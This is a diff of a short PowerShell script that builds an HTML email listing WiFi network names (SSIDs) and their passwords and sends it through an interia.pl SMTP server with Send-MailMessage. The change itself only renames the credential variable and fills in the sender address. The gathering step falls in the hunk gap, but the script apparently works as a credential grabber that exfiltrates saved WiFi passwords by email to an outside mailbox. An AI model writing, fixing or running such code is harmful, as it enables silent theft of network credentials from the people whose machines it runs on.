@@ -1,7 +1,7 @@
 $SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
 $secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
 $user = $username + "@interia.pl"
-$cred1 = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
+$cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
 $Subject = "WiFi"
 
 $p = @()
@@ -12,4 +12,4 @@ foreach ($pm in $p)
 $Body += "<h3>SSID: 3333<br>PASSWORD: ::</h3>" -replace "::",$pm.PASS  -replace "3333",$pm.SSID
 }
 
-Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred1 -UseSsl -BodyAsHtml
+Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml
